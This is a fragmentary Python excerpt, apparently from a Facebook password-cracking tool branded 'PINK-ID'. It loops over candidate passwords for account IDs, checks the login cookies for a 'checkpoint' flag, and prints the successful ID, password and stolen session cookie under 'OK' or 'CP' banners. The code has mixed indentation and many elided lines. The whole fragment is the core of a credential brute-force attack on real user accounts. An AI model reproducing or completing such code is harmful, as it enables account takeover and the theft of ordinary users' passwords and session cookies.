	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n') 
                statuscp = f'\r{K}>> {idf}|{pw}{N}'    
                statuscp1 = nel(statuscp, style='yellow')
				cetak(nel(statuscp1, title='PINK-ID CP'))
				...
				print('\n') 
				statusok = f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}'
				statusok1 = nel(statusok, style='green')
				cetak(nel(statusok1, title='PINK-ID OK'))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]PINK-ID OK[/bold green]'))
					ok+=1
					break
